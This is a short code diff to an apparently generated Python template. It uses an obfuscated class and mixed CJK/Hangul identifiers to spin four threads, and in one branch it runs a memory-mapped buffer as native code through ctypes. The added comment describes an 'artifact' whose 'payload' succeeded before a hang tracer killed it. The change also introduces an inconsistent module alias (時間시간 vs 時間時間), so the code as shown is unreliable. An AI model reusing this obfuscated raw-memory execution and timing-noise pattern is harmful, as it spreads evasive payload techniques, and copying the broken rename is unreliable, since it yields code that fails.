@@ -4781,9 +4781,16 @@ class {ATTRITION_CLS}:
                     func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_int.from_buffer(mm)))
                     while not {ATTRITION_CLS}._stop_entropy:
                         func()
+                        _nixon_時間시간.sleep(0.05)
                 else:
                     while not {ATTRITION_CLS}._stop_entropy:
-                        _ = _nixon_時間시간.perf_counter_ns()
+                        _ = _nixon_時間時間.perf_counter_ns()
+                        # No sleep here means four threads spin flat out on the
+                        # GIL. On a slow or ARM host that delays interpreter
+                        # shutdown for minutes: the artifact printed its correct
+                        # output and then hung until the hang tracer killed it,
+                        # which read as a failure when the payload had succeeded.
+                        _nixon_時間時間.sleep(0.05)
             except: pass
         for _ in range(4):
             _nixon_スレッディング스레딩.Thread(target=_spam_rdtsc, daemon=True).start()
